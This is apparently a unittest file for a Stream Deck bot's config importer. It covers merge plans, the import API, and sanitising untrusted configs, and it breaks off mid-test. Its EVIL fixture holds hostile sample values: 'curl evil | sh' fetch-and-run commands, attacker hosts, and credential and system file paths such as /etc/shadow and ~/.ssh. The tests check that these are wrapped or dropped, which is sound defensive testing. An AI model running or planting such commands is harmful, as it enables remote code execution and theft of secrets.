"""Importing settings from another config: finding candidates, the merge plan, applying it
(never losing what you have unless you choose to), and the /api/import routes."""
import copy
import json
import os
import unittest
import urllib.error
import urllib.request
from unittest import mock

from tests.helpers import EXAMPLE, ROOT, Deck, free_port, tmpdir

import yaml  # noqa: E402

from core import configio, editor_auth, importer  # noqa: E402
from core.bot import DeckBot, resolve_key  # noqa: E402

LEGACY = os.path.join(ROOT, "tests", "fixtures", "legacy_config.yaml")
LEGACY_PAGES = ["main", "home", "twitch", "brb", "radio", "steam"]


def load(path):
    with open(path) as f:
        return yaml.safe_load(f)


def example():
    return load(EXAMPLE)


def legacy():
    return load(LEGACY)


def paths(items):
    return [i["path"] for i in items]


def leaves(cfg, prefix=()):
    """Every (path tuple, value) of cfg down to non-dict values."""
    if isinstance(cfg, dict) and cfg:
        for k, v in cfg.items():
            yield from leaves(v, prefix + (k,))
    else:
        yield prefix, cfg


def get(cfg, path):
    for p in path:
        cfg = cfg[p]
    return cfg


def show(cfg, model="Stream Deck XL"):
    """The pages a deck of `model` would show for cfg (resolved key dicts)."""
    bot = DeckBot(root=ROOT, config_path=os.path.join(tmpdir(), "config.yaml"))
    bot.deck = Deck(model)
    bot.cfg = cfg
    bot.select_layout()
    return bot


class Fresh(unittest.TestCase):
    def test_example_is_fresh(self):
        self.assertTrue(importer.is_fresh(example(), EXAMPLE))
        cfg = example()
        cfg["editor"] = {"port": 9999}
        cfg["twitch"].pop("channel")          # empty-string values don't count either way
        self.assertTrue(importer.is_fresh(cfg, EXAMPLE))
        cfg["twitch"]["channel"] = "someone"
        self.assertFalse(importer.is_fresh(cfg, EXAMPLE))
        self.assertFalse(importer.is_fresh(legacy(), EXAMPLE))

    def test_fresh_example_takes_legacy_setup(self):
        cur, inc = example(), legacy()
        plan = importer.plan(cur, inc, target_layout="8x4", fresh=True)
        added = {a["path"]: a["summary"] for a in plan["added"]}
        self.assertIn("twitch.channel", added)                 # example has ""
        self.assertIn("twitch.client_id", added)
        self.assertIn("home_assistant", added)
        self.assertTrue(added["layouts"].startswith("Replaces the example layouts with your pages"))
        for page in LEGACY_PAGES:
            self.assertIn(page, added["layouts"])
        self.assertNotIn("editor", " ".join(added))
        self.assertTrue(plan["fresh"])
        defaults = importer.defaults(plan)
        self.assertEqual(set(defaults), set(paths(plan["conflicts"])))
        self.assertEqual(set(defaults.values()), {"incoming"})

        merged, counts = importer.apply(cur, inc, {}, target_layout="8x4", fresh=True)
        self.assertEqual(counts, {"added": len(plan["added"]), "replaced": len(plan["conflicts"]), "kept": 0})
        self.assertNotIn("layouts", merged)
        self.assertEqual(merged["pages"], inc["pages"])
        self.assertEqual(merged["twitch"]["channel"], "examplechannel")
        self.assertEqual(merged["brb"]["polls"], inc["brb"]["polls"])   # conflict, fresh → incoming
        self.assertEqual(merged["brb"]["highlights_dir"], cur["brb"]["highlights_dir"])  # only in current
        self.assertEqual(merged["keys"], cur["keys"])
        self.assertEqual(yaml.safe_load(configio.dumps(merged)), merged)   # writes and reads back

        bot = show(merged)
        self.assertEqual(bot.layout_name, "pages")
        self.assertEqual(sorted(bot.pages), sorted(LEGACY_PAGES))
        self.assertEqual(bot.pages["main"][:32], [resolve_key(k, {}) for k in inc["pages"]["main"]])
        self.assertEqual(bot.pages["main"][3]["label"], "Twitch")

    def test_fresh_choice_current_keeps_example_value(self):
        plan = importer.plan(example(), legacy(), fresh=True)
        self.assertEqual(paths(plan["conflicts"]), ["brb.polls"])
        merged, counts = importer.apply(example(), legacy(), {"brb.polls": "current"}, fresh=True)
        self.assertEqual(merged["brb"]["polls"], example()["brb"]["polls"])
        self.assertEqual(counts["kept"], 1)


class Merge(unittest.TestCase):
    def mine(self):
        cfg = example()
        cfg["twitch"]["channel"] = "mychannel"
        return cfg

    def test_conflict_defaults_to_current(self):
        cur, inc = self.mine(), legacy()
        self.assertFalse(importer.is_fresh(cur, EXAMPLE))
        plan = importer.plan(cur, inc, target_layout="8x4")
        conflict = next(c for c in plan["conflicts"] if c["path"] == "twitch.channel")
        self.assertEqual(conflict["current"], "mychannel")
        self.assertEqual(conflict["incoming"], "examplechannel")
        self.assertIn("twitch.client_id", paths(plan["added"]))
        self.assertEqual(importer.defaults(plan)["twitch.channel"], "current")
        self.assertEqual(plan["target_layout"], "8x4")

        merged, counts = importer.apply(cur, inc, {}, target_layout="8x4")
        self.assertEqual(merged["twitch"]["channel"], "mychannel")
        self.assertEqual(merged["twitch"]["client_id"], "abc123exampleclientid")
        self.assertEqual(counts, {"added": len(plan["added"]), "replaced": 0, "kept": len(plan["conflicts"])})
        self.assertEqual(merged["layouts"]["8x4"]["main"], cur["layouts"]["8x4"]["main"])
        self.assertEqual(merged["layouts"]["8x4"]["home"], inc["pages"]["home"])   # new page added

        merged, counts = importer.apply(cur, inc, {"twitch.channel": "incoming"}, target_layout="8x4")
        self.assertEqual(merged["twitch"]["channel"], "examplechannel")
        self.assertEqual(counts["replaced"], 1)

    def test_flat_pages_map_into_the_matching_grid(self):
        cur, inc = self.mine(), legacy()
        plan = importer.plan(cur, inc)                 # no attached deck: 32 keys → 8x4
        self.assertEqual(plan["target_layout"], "8x4")
        self.assertIn("layouts.8x4.pages.home", paths(plan["added"]))
        self.assertIn("layouts.8x4.pages.main", paths(plan["conflicts"]))
        cur["layouts"] = {"Stream Deck XL": {"pages": {"main": [["a"]]}}, **cur["layouts"]}
        plan = importer.plan(cur, inc, target_layout="Stream Deck XL")
        self.assertEqual(plan["target_layout"], "Stream Deck XL")
        self.assertIn("layouts.Stream Deck XL.pages.home", paths(plan["added"]))
        merged, _ = importer.apply(cur, inc, {"layouts.Stream Deck XL.pages.main": "incoming"},
                                   target_layout="Stream Deck XL")
        self.assertEqual(merged["layouts"]["Stream Deck XL"]["pages"]["main"], inc["pages"]["main"])
        self.assertEqual(merged["layouts"]["8x4"], cur["layouts"]["8x4"])
        bot = show(merged)
        self.assertEqual(bot.layout_name, "Stream Deck XL")
        self.assertEqual(bot.pages["home"][0]["label"], "Office")

    def test_changed_page_conflicts_unchanged_pages_same(self):
        cur, inc = legacy(), legacy()
        cur["pages"]["main"][0] = {"label": "Mine"}
        plan = importer.plan(cur, inc)
        self.assertEqual(plan["added"], [])
        self.assertEqual(paths(plan["conflicts"]), ["pages.main"])
        self.assertIn("Mine", plan["conflicts"][0]["current"])
        self.assertGreaterEqual(plan["same"], len(LEGACY_PAGES) - 1)
        self.assertIsNone(plan["target_layout"])
        merged, _ = importer.apply(cur, inc, {"pages.main": "incoming"})
        self.assertEqual(merged["pages"]["main"], inc["pages"]["main"])

    def test_blank_spellings_compare_equal(self):
        cur = {"pages": {"p": ["a", "-", None, "-"], "r": [["a", "-"], [None]]}}
        inc = {"pages": {"p": ["a", None], "r": [["a"]]}}
        plan = importer.plan(cur, inc)
        self.assertEqual((plan["added"], plan["conflicts"], plan["same"]), ([], [], 2))
        # rows vs flat are not assumed equal (rows depend on the grid)
        plan = importer.plan({"pages": {"p": [["a", "b"]]}}, {"pages": {"p": ["a", "b"]}})
        self.assertEqual(paths(plan["conflicts"]), ["pages.p"])

    def test_saved_keys(self):
        cur = self.mine()
        inc = {"keys": {"brand_new": {"label": "New", "action": {"page": "x"}},
                        "back": {"label": "Go back", "action": {"page": "back"}},
                        "to_twitch": copy.deepcopy(cur["keys"]["to_twitch"])},
               "pages": {"main": ["brand_new"]}}
        plan = importer.plan(cur, inc)
        self.assertIn("keys.brand_new", paths(plan["added"]))
        self.assertIn("keys.back", paths(plan["conflicts"]))
        self.assertNotIn("keys.to_twitch", paths(plan["added"]) + paths(plan["conflicts"]))
        merged, counts = importer.apply(cur, inc, {})
        self.assertEqual(merged["keys"]["brand_new"]["label"], "New")
        self.assertEqual(merged["keys"]["back"], cur["keys"]["back"])
        self.assertEqual(set(cur["keys"]) - set(merged["keys"]), set())

    def test_never_drops_current_values(self):
        """Whatever is chosen, every value of yours survives unless its own conflict went to "incoming"."""
        for cur, inc in ((legacy(), example()), (self.mine(), legacy()), (example(), legacy())):
            plan = importer.plan(cur, inc)
            for choice in ("current", "incoming"):
                choices = {p: choice for p in paths(plan["conflicts"])}
                merged, counts = importer.apply(cur, inc, choices)
                self.assertEqual(sum(counts.values()), len(plan["added"]) + len(plan["conflicts"]))
                replaced = [p for p, c in choices.items() if c == "incoming"]
                for path, value in leaves(cur):
                    logical = path
                    if path[0] == "layouts" and len(path) > 2 and path[2] != "pages":
                        logical = path[:2] + ("pages",) + path[2:]   # plan paths always say .pages.
                    dotted = importer._path(*logical)
                    if value in ("", None) or any(dotted == r or dotted.startswith(r + ".") for r in replaced):
                        continue   # an empty value is filled in; a replaced one was your choice
                    self.assertEqual(get(merged, path), value, dotted)
                if choice == "current":   # nothing of yours changed: merged ⊇ current
                    self.assertEqual(counts["replaced"], 0)

    def test_flat_current_takes_incoming_layout_page_by_page(self):
        cur, inc = legacy(), example()
        plan = importer.plan(cur, inc)
        # the example's 8x4 pages are compared against your flat pages, not added on top of them
        self.assertIn("pages.main", paths(plan["conflicts"]))
        self.assertNotIn("layouts.8x4", paths(plan["added"]))
        self.assertIn("layouts.5x3", paths(plan["added"]))
        merged, _ = importer.apply(cur, inc, {})
        self.assertNotIn("8x4", merged["layouts"])
        bot = show(merged)
        self.assertEqual(bot.layout_name, "pages")       # your XL still shows your pages
        self.assertEqual(bot.pages["home"][0]["label"], "Office")

    def test_deterministic(self):
        a = importer.apply(self.mine(), legacy(), {"twitch.channel": "incoming"})
        b = importer.apply(self.mine(), legacy(), {"twitch.channel": "incoming"})
        self.assertEqual(a, b)
        self.assertEqual(importer.plan(self.mine(), legacy()), importer.plan(self.mine(), legacy()))
        cur = self.mine()
        before = copy.deepcopy(cur)
        importer.apply(cur, legacy(), {p: "incoming" for p in paths(importer.plan(cur, legacy())["conflicts"])})
        self.assertEqual(cur, before)                     # inputs are never modified

    def test_layout_settings_wrap_a_plain_layout(self):
        cur = {"layouts": {"8x4": {"main": [["a"]]}}}
        inc = {"layouts": {"8x4": {"pages": {"main": [["a"]], "extra": [["b"]]}, "start_page": "extra"}}}
        plan = importer.plan(cur, inc)
        self.assertEqual(sorted(paths(plan["added"])), ["layouts.8x4.pages.extra", "layouts.8x4.start_page"])
        merged, _ = importer.apply(cur, inc, {})
        self.assertEqual(merged["layouts"]["8x4"], {"pages": {"main": [["a"]], "extra": [["b"]]},
                                                    "start_page": "extra"})
        self.assertEqual(show(merged).page, "extra")

    def test_incoming_layout_beats_its_own_flat_pages(self):
        cur = {"layouts": {"8x4": {"main": [["mine"]]}}}
        inc = {"pages": {"main": ["flat"] * 32, "only_flat": ["f"] * 32},
               "layouts": {"8x4": {"pages": {"main": [["laid out"]]}, "start_page": "main"}}}
        plan = importer.plan(cur, inc)
        self.assertEqual(paths(plan["conflicts"]), ["layouts.8x4.pages.main"])
        self.assertIn("laid out", plan["conflicts"][0]["incoming"])
        self.assertEqual(sorted(paths(plan["added"])), ["layouts.8x4.pages.only_flat", "layouts.8x4.start_page"])
        merged, _ = importer.apply(cur, inc, {})
        self.assertEqual(merged["layouts"]["8x4"], {"pages": {"main": [["mine"]], "only_flat": ["f"] * 32},
                                                    "start_page": "main"})

    def test_empty_values_and_odd_names(self):
        cur = {"twitch": {"channel": "me"}, "pages": {"a.b": ["x"]}, "obs": {}}
        inc = {"twitch": {"channel": "", "slow_mode_seconds": 30}, "pages": {"a.b": ["y"], "c": []},
               "obs": {}, "brightness": 50, "font": ""}
        plan = importer.plan(cur, inc)
        self.assertEqual(sorted(paths(plan["added"])), ["brightness", "twitch.slow_mode_seconds"])
        self.assertEqual(paths(plan["conflicts"]), ['pages."a.b"'])
        merged, _ = importer.apply(cur, inc, {'pages."a.b"': "incoming"})
        self.assertEqual(merged["twitch"]["channel"], "me")          # an empty value never blanks yours
        self.assertEqual(merged["pages"]["a.b"], ["y"])

    def test_bad_choice(self):
        with self.assertRaises(ValueError):
            importer.apply(self.mine(), legacy(), {"twitch.channel": "both"})

    def test_conflict_snippets_truncated(self):
        cur = {"pages": {"p": ["a" * 3000]}}
        inc = {"pages": {"p": ["b" * 3000]}}
        c = importer.plan(cur, inc)["conflicts"][0]
        self.assertLessEqual(len(c["current"]), 2000)
        self.assertTrue(c["incoming"].endswith("…"))


class Candidates(unittest.TestCase):
    def test_finds_configs_and_skips_the_rest(self):
        home = tmpdir()
        with open(LEGACY) as f:
            legacy_text = f.read()

        def put(rel, text):
            p = os.path.join(home, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "w") as f:
                f.write(text)
            return p
        two_deep = put("Games/deck/config.yaml", legacy_text)
        put(".hidden/config.yaml", legacy_text)
        put("node_modules/x/config.yaml", legacy_text)
        put("big/config.yaml", legacy_text + "#" * (2 * 1024 * 1024) + "\n")
        put("nopages/config.yaml", "twitch: {channel: x}\n")
        put("list/config.yaml", "- pages\n")
        put("bad/config.yaml", "pages: [unclosed\n")
        put("a/b/c/d/config.yaml", legacy_text)                # depth 4: too deep
        three_deep = put("a/b/c/config.yaml", "layouts: {8x4: {main: [[x]]}}\n")
        current = put("cur/config.yaml", "pages: {main: [x]}\n")
        os.utime(current, (1, 1))
        found = [c for c in importer.candidates(home=home, current_path=current) if c["path"].startswith(home)]
        self.assertEqual(sorted(c["path"] for c in found), sorted([two_deep, three_deep, current]))
        self.assertEqual(found[-1]["path"], current)            # newest first
        by = {c["path"]: c for c in found}
        self.assertTrue(by[current]["current"])
        self.assertFalse(by[two_deep]["current"])
        self.assertEqual(by[two_deep]["pages"], 6)
        self.assertEqual(by[two_deep]["layouts"], 0)
        self.assertEqual(by[three_deep]["layouts"], 1)
        self.assertIn("twitch", by[two_deep]["sections"])
        self.assertNotIn("pages", by[two_deep]["sections"])


class LoadSource(unittest.TestCase):
    def test_rejects_non_configs_without_echoing_them(self):
        for text in ("secret: hunter2\n", "pages: [hunter2, unclosed\n", "- hunter2\n", "hunter2", "pages: {}\n"):
            with self.assertRaises(ValueError) as e:
                importer.load_source(text=text)
            self.assertEqual(str(e.exception), "That file isn’t a deck config")
        p = os.path.join(tmpdir(), "config.yaml")
        with open(p, "w") as f:
            f.write("token: hunter2\n")
        with self.assertRaises(ValueError) as e:
            importer.load_source(path=p)
        self.assertNotIn("hunter2", str(e.exception))

    def test_arguments_and_size(self):
        with self.assertRaises(ValueError):
            importer.load_source()
        with self.assertRaises(ValueError):
            importer.load_source(path=LEGACY, text="pages: {a: [x]}")
        with self.assertRaises(ValueError):
            importer.load_source(text="pages: {a: [x]}\n" + "#" * (1024 * 1024))
        with self.assertRaises(ValueError):
            importer.load_source(path=os.path.join(tmpdir(), "missing.yaml"))
        self.assertEqual(importer.load_source(path=LEGACY)["twitch"]["channel"], "examplechannel")


# ------------------------------------------------------------------ the API, on a sandbox server

PORT = free_port()


class ReservedNames(unittest.TestCase):
    """Pages named back / pages / start_page are renamed in any incoming config."""

    def test_unwrapped_layout_page_called_pages(self):
        incoming = {"layouts": {"8x4": {"pages": [[{"label": "P"}]],
                                        "main": [[{"label": "Go", "action": {"page": "pages"}}]]}}}
        cur = example()
        merged, _ = importer.apply(cur, incoming, {"layouts.8x4.pages.main": "incoming"})
        pages = importer._layout_parts(merged["layouts"]["8x4"])[0]
        self.assertIn("pages_page", pages)
        self.assertNotIn("pages", pages)
        self.assertEqual(pages["main"], [[{"label": "Go", "action": {"page": "pages_page"}}]])
        for name in ("twitch", "brb", "radio", "steam"):           # yours are all still there
            self.assertIn(name, pages)
        bot = show(merged)
        self.assertIn("pages_page", bot.pages)
        self.assertIn("twitch", bot.pages)

    def test_flat_and_wrapped_pages(self):
        incoming = {"pages": {"Pages": [[{"label": "a"}]], "start_page": [[{"label": "b"}]],
                              "back": [[{"label": "c", "action": {"page": "back"}}]],
                              "home": [[{"action": [{"page": "Pages"}, {"page": "start_page"}]}]]},
                    "start_page": "Pages",
                    "layouts": {"5x3": {"pages": {"pages": [], "x": [[{"action": {"page": "pages"}}]]},
                                        "start_page": "pages"}}}
        fixed = importer._fix_reserved(incoming)
        self.assertEqual(set(fixed["pages"]), {"pages_page", "start_page_page", "back_page", "home"})
        self.assertEqual(fixed["start_page"], "pages_page")
        self.assertEqual(fixed["pages"]["home"], [[{"action": [{"page": "pages_page"}, {"page": "start_page_page"}]}]])
        self.assertEqual(fixed["pages"]["back_page"], [[{"label": "c", "action": {"page": "back"}}]])
        lay = fixed["layouts"]["5x3"]
        self.assertEqual(set(lay["pages"]), {"pages_page", "x"})
        self.assertEqual(lay["start_page"], "pages_page")
        self.assertIn("Pages", incoming["pages"])                       # the input isn't changed
        p = importer.plan({}, incoming)
        self.assertFalse([a for a in paths(p["added"]) if a.endswith((".pages", ".start_page", ".back"))
                          and a.count(".") > 1])

    def test_ordinary_configs_untouched(self):
        cfg = legacy()
        self.assertIs(importer._fix_reserved(cfg), cfg)
        wrapped = {"layouts": {"8x4": {"pages": {"main": []}, "start_page": "main"}}}
        self.assertIs(importer._fix_reserved(wrapped), wrapped)


class GridPlacement(unittest.TestCase):
    """Flat incoming pages land in the layout of their real grid, not "32 keys = 8x4"."""

    def studio_pages(self):
        return {"pages": {"wide": [[{"label": str(i)} for i in range(16)], [None] * 16]}}

    def test_rows_shape_beats_key_count(self):
        cur = example()
        cur["layouts"]["16x2"] = {"home": [[{"label": "studio"}]]}
        p = importer.plan(cur, self.studio_pages())
        self.assertEqual(p["target_layout"], "16x2")
        self.assertIn("layouts.16x2.pages.wide", paths(p["added"]))

    def test_new_layout_for_unseen_grid(self):
        p = importer.plan(example(), self.studio_pages())
        self.assertIn("layouts.16x2", paths(p["added"]))
        self.assertFalse([a for a in paths(p["added"]) if a.startswith("layouts.8x4")])

    def test_target_grid_for_flat_key_lists(self):
        cur = example()
        cur["layouts"]["16x2"] = {"home": []}
        flat = {"pages": {"wide": [{"label": str(i)} for i in range(32)]}}
        self.assertEqual(importer.plan(cur, flat)["target_layout"], "8x4")       # last-resort fallback
        p = importer.plan(cur, flat, target_grid=(16, 2))
        self.assertEqual(p["target_layout"], "16x2")
        merged, _ = importer.apply(cur, flat, {}, target_grid=(16, 2))
        self.assertIn("wide", importer._layout_parts(merged["layouts"]["16x2"])[0])

    def test_target_layout_name_gives_the_grid(self):
        cur = example()
        cur["layouts"]["16x2"] = {"home": []}
        flat = {"pages": {"wide": [{"label": str(i)} for i in range(32)]}}
        self.assertEqual(importer.plan(cur, flat, target_layout="Stream Deck Studio")["target_layout"], "16x2")

    def test_8x4_still_found(self):
        incoming = {"pages": {"new": [[None] * 8] * 4}}
        self.assertEqual(importer.plan(example(), incoming)["target_layout"], "8x4")


def setUpModule():
    global BOT, CONFIG, BASE, TOKEN
    CONFIG = os.path.join(tmpdir(), "config.yaml")
    cfg = example()
    cfg["editor"] = {"port": PORT}
    with open(CONFIG, "w") as f:
        f.write(yaml.safe_dump(cfg, sort_keys=False, allow_unicode=True))
    BOT = DeckBot(root=ROOT, config_path=CONFIG)
    BOT.deck = Deck("Stream Deck XL")
    BOT.load_config(initial=True)
    BOT.load_extensions("modules")
    BASE, TOKEN = f"http://127.0.0.1:{PORT}", editor_auth.token()


def tearDownModule():
    for inst in list(BOT.modules.values()):
        try:
            inst.on_unload()
        except Exception:
            pass


def call(path, body=None):
    h = {"X-Deck-Token": TOKEN}
    data = None
    if body is not None:
        data, h["Content-Type"] = json.dumps(body).encode(), "application/json"
    req = urllib.request.Request(BASE + path, data=data, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        with e:
            return e.code, json.loads(e.read() or b"{}")


class Api(unittest.TestCase):
    def test_round_trip(self):
        status, cands = call("/api/import/candidates")
        self.assertEqual(status, 200)
        self.assertTrue(cands["fresh"])
        self.assertIn(CONFIG, [c["path"] for c in cands["candidates"] if c["current"]])

        status, prev = call("/api/import/preview", {"path": LEGACY})
        self.assertEqual(status, 200, prev)
        self.assertTrue(prev["plan"]["fresh"])
        self.assertIn("twitch.channel", paths(prev["plan"]["added"]))
        self.assertEqual(prev["defaults"], {"brb.polls": "incoming"})

        stale = "0" * 64
        status, _ = call("/api/import/apply", {"path": LEGACY, "choices": {}, "hash": stale})
        self.assertEqual(status, 409)
        status, _ = call("/api/import/apply", {"path": LEGACY, "choices": {"brb.polls": "yes"},
                                               "hash": configio.file_hash(CONFIG)})
        self.assertEqual(status, 400)

        old = configio.file_hash(CONFIG)
        status, res = call("/api/import/apply", {"path": LEGACY, "choices": {"brb.polls": "current"}, "hash": old})
        self.assertEqual(status, 200, res)
        self.assertTrue(res["ok"])
        self.assertNotEqual(res["hash"], old)
        self.assertEqual(res["hash"], configio.file_hash(CONFIG))
        self.assertEqual(res["counts"], {"added": len(prev["plan"]["added"]), "replaced": 0, "kept": 1})
        saved = configio.load(CONFIG)
        # Its Home Assistant keys arrive switched off: the legacy config is someone else's file.
        self.assertEqual(saved["pages"]["home"], importer.sanitize(legacy())[0]["pages"]["home"])
        self.assertIn("needs_review", saved["pages"]["home"][0]["action"])
        self.assertEqual(saved["pages"]["home"][0]["action"]["needs_review"]["imported_action"],
                         legacy()["pages"]["home"][0]["action"])
        self.assertNotIn("layouts", saved)
        self.assertEqual(saved["twitch"]["channel"], "examplechannel")
        self.assertEqual(saved["brb"]["polls"], example()["brb"]["polls"])
        self.assertEqual(saved["editor"], {"port": PORT})

        status, _ = call("/api/import/apply", {"path": LEGACY, "choices": {}, "hash": old})   # now stale
        self.assertEqual(status, 409)
        status, again = call("/api/import/preview", {"path": LEGACY})
        self.assertFalse(again["plan"]["fresh"])           # it's your setup now
        self.assertEqual(again["plan"]["added"], [])
        self.assertEqual(again["defaults"], {"brb.polls": "current"})   # the one you kept

    def test_bad_requests(self):
        self.assertEqual(call("/api/import/preview", {})[0], 400)
        self.assertEqual(call("/api/import/preview", {"path": LEGACY, "text": "x"})[0], 400)
        status, res = call("/api/import/preview", {"text": "password: hunter2\n"})
        self.assertEqual(status, 400)
        self.assertNotIn("hunter2", json.dumps(res))
        self.assertEqual(call("/api/import/preview", {"text": "#" * (1024 * 1024 + 1)})[0], 413)
        self.assertEqual(call("/api/import/apply", {"path": LEGACY, "choices": {}})[0], 400)   # no hash


# ------------------------------------------------------------------ an untrusted config.yaml

EVIL = {
    "home_assistant": {"url": "https://evil.example", "token_file": "~/.config/ultimate-streaming/twitch.json"},
    "obs": {"host": "evil.example", "port": 4455, "password": "x", "password_file": "~/p", "scene": "Live"},
    "twitch_bot": {"database_url": "postgresql://evil", "enabled": True,
                   "rewards": [{"title": "Hi", "actions": [{"run": "sh"}], "allow_unsafe_actions": True}]},
    "steam": {"command": "curl evil | sh"},
    "pages": {
        "main": [
            {"label": "Test", "state": {"cmd": "curl evil|sh"}, "active": {"bg": "#c00"}},
            {"label": "Snip", "action": {"run": "curl evil|sh"}},
            {"label": "Old", "action": "curl evil|sh"},
            {"label": "Live", "action": {"obs_scene": "Live"}, "state": {"obs_scene": "Live"}},
            {"label": "Twitch", "action": {"page": "twitch"}},
            {"label": "Time", "display": {"source": "clock", "show": "time", "every": 5}},
            {"label": "Viewers", "display": "twitch_viewers"},
            {"label": "Mix", "action": [{"page": "twitch"}, {"keys": "ctrl+alt+t"}]},
        ],
        "twitch": {"keys": [[{"label": "Back", "action": {"page": "back"}}]],
                   "dials": [{"label": "Vol", "left": {"volume": "down"}, "press": {"obs_mute": "Mic/Aux"}}]},
    },
    "keys": {"lock": {"label": "Lock", "action": {"run": "loginctl lock-session"}}},
}
SAFE = {"pages": {"main": [
    {"label": "Twitch", "action": {"page": "twitch"}},
    {"label": "Live", "action": [{"obs_scene": "Live"}, {"delay": 0.5}, {"obs_mute": "Mic/Aux"}],
     "state": {"obs": "stream", "every": 2}, "active": {"bg": "#c00"}},
    {"label": "BRB", "action": {"countdown_toggle": {"seconds": 300, "scene": "BRB", "name": "brb_timer"}},
     "display": {"source": "countdown", "timer": "brb_timer"}},
    {"label": "Radio", "action": {"radio": "toggle"}, "state": {"radio": "on"}, "display": "radio"},
    {"label": "Dim", "action": {"brightness": "cycle"}, "state": {"deck_asleep": True}},
], "twitch": [{"label": "Back", "action": {"page": "back"}}]}}


def wrapped(v):
    return {"needs_review": {"imported_action": v, "source": "config.yaml", "original_id": ""}}


class Sanitize(unittest.TestCase):
    def setUp(self):
        self.cfg, self.dropped = importer.sanitize(copy.deepcopy(EVIL))
        self.main = self.cfg["pages"]["main"]

    def test_commands_states_and_displays_are_wrapped(self):
        self.assertEqual(self.main[0]["state"], wrapped({"cmd": "curl evil|sh"}))
        self.assertEqual(self.main[0]["active"], {"bg": "#c00"})
        self.assertEqual(self.main[1]["action"], wrapped({"run": "curl evil|sh"}))
        self.assertEqual(self.main[2]["action"], wrapped({"run": "curl evil|sh"}))      # a string is a shell command
        self.assertEqual(self.main[6]["display"], wrapped({"source": "twitch_viewers"}))
        self.assertEqual(self.main[7]["action"], wrapped([{"page": "twitch"}, {"keys": "ctrl+alt+t"}]))
        dial = self.cfg["pages"]["twitch"]["dials"][0]
        self.assertEqual(dial["left"], wrapped({"volume": "down"}))
        self.assertEqual(dial["press"], {"obs_mute": "Mic/Aux"})
        self.assertEqual(self.cfg["keys"]["lock"]["action"], wrapped({"run": "loginctl lock-session"}))

    def test_allow_listed_pass_through_unchanged(self):
        for i in (3, 4, 5):
            self.assertEqual(self.main[i], EVIL["pages"]["main"][i])
        self.assertEqual(self.cfg["pages"]["twitch"]["keys"], EVIL["pages"]["twitch"]["keys"])
        safe, dropped = importer.sanitize(copy.deepcopy(SAFE))
        self.assertEqual((safe, dropped), (SAFE, []))
        self.assertEqual(importer.review_items(safe), [])

    def test_odd_arguments_and_unknown_names_wait(self):
        for action in ({"page": ""}, {"brightness": 500}, {"obs_studio": "on"}, {"countdown": {"name": "../x"}},
                       {"brb_poll": {"question": "q", "options": ["a", "b"]}}, {"media": "next"},
                       {"notify": "hi"}, {"obs": "ToggleStream"}, {"bambu_stop": None}, {"page": "x", "run": "y"}):
            self.assertIn("needs_review", importer._safe_field("action", action), action)
        for state in ({"obs": "stream", "cmd": "x"}, {"every": 1}, {"media": "playing"}, {"ha": "light.x"}):
            self.assertIn("needs_review", importer._safe_field("state", state), state)
        for display in ({"source": "clock", "format": "x"}, {"source": "bambu_status"}, "obs_uptime_x"):
            self.assertIn("needs_review", importer._safe_field("display", display), display)

    def test_rewrapped_and_unreadable(self):
        forged = {"needs_review": {"imported_action": {"run": "x"}, "source": "elgato", "original_id": "‮evil"}}
        self.assertEqual(importer._safe_field("action", forged), wrapped({"run": "x"}))
        self.assertIs(importer._safe_field("action", 5), importer._DROP)
        self.assertIs(importer._safe_field("state", "cmd"), importer._DROP)
        cfg, _ = importer.sanitize({"pages": {"p": [{"label": "N", "action": 5, "state": "x"}]}})
        self.assertEqual(cfg["pages"]["p"], [{"label": "N"}])

    def test_layouts_are_wrapped_too(self):
        cfg, _ = importer.sanitize({"layouts": {
            "8x4": {"main": [[None, {"action": {"run": "a"}}]], "start_page": "main"},
            "5x3": {"pages": {"main": {"keys": [{"state": {"cmd": "b"}}]}}, "start_page": "main"}}})
        self.assertEqual(cfg["layouts"]["8x4"]["main"][0][1]["action"], wrapped({"run": "a"}))
        self.assertEqual(cfg["layouts"]["8x4"]["start_page"], "main")
        self.assertEqual(cfg["layouts"]["5x3"]["pages"]["main"]["keys"][0]["state"], wrapped({"cmd": "b"}))
        paths = [(r["path"], r["field"]) for r in importer.review_items(cfg)]
        self.assertEqual(paths, [(["layouts", "8x4", "main", 0, 1], "action"),
                                 (["layouts", "5x3", "pages", "main", "keys", 0], "state")])

    def test_sensitive_settings_dropped_and_listed(self):
        self.assertEqual(self.dropped, [
            "home_assistant.url", "home_assistant.token_file", "obs.host", "obs.port", "obs.password",
            "obs.password_file", "twitch_bot.database_url", "twitch_bot.rewards[0].allow_unsafe_actions",
            "steam.command"])
        self.assertNotIn("home_assistant", self.cfg)            # nothing left in it to import
        self.assertEqual(self.cfg["obs"], {"scene": "Live"})
        self.assertEqual(self.cfg["twitch_bot"], {"enabled": True, "rewards": [{"title": "Hi", "actions": [{"run": "sh"}]}]})
        self.assertNotIn("steam", self.cfg)
        # Nested and top-level spellings too; never inside pages (a key's icon is its own business).
        cfg, dropped = importer.sanitize({"font": "/etc/shadow", "brb": {"media_dir": "~/.ssh", "scene": "BRB"},
                                          "radio": {"dir": "/"}, "x": {"y": {"z_file": "a", "url": "b"}},
                                          "pages": {"p": [{"label": "a", "icon": "x.png"}]}})
        self.assertEqual(dropped, ["font", "brb.media_dir", "radio.dir", "x.y.z_file", "x.y.url"])
        self.assertEqual(cfg, {"brb": {"scene": "BRB"}, "x": {"y": {}},
                               "pages": {"p": [{"label": "a", "icon": "x.png"}]}})

    def test_icons_that_could_name_any_file_are_dropped_and_listed(self):
        keep = ["emoji:🎮", "emoji:/", "mic", "steam:730", "my-icons/logo.png", "logo.png"]
        bad = ["/etc/passwd", "~/.ssh/id.png", "../x.png", "a/../../x.png", "~", "C:\\x.png"]
        keys = [{"label": f"k{i}", "icon": v} for i, v in enumerate(keep)]
        keys += [{"label": f"b{i}", "icon": v} for i, v in enumerate(bad)]
        cfg, dropped = importer.sanitize({"pages": {"p": [keys]}})
        row = cfg["pages"]["p"][0]
        self.assertEqual([k.get("icon") for k in row[:len(keep)]], keep)
        self.assertTrue(all("icon" not in k and k["label"].startswith("b") for k in row[len(keep):]))
        self.assertEqual(dropped, [f"p/b{i}.icon" for i in range(len(bad))])

    def test_icons_screened_in_layouts_saved_keys_dials_and_overrides(self):
        evil = "/home/me/secret.png"
        cfg, dropped = importer.sanitize({
            "layouts": {"8x4": {"main": [[{"icon": evil}]]},
                        "5x3": {"pages": {"m": {"keys": [{"label": "A", "icon": "mic"}],
